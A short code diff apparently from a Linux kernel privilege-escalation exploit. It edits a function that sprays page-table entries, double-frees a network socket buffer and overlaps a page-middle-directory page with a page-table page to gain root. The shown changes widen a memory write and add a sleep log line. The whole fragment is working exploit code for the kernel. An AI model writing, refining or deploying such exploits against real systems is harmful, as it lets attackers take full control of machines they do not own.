@@ -329,7 +329,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0xCAFECAFE;
+		*(unsigned long long*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0xCAFECAFE;
 
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
@@ -344,6 +344,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	alloc_intermed_buf_hdr(0, &df_ip_header);
 
 	// allocate overlapping PMD page (overlaps with PTE)
+	printf("[*] SLEEP 3s...\n");
 	sleep(3);
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 
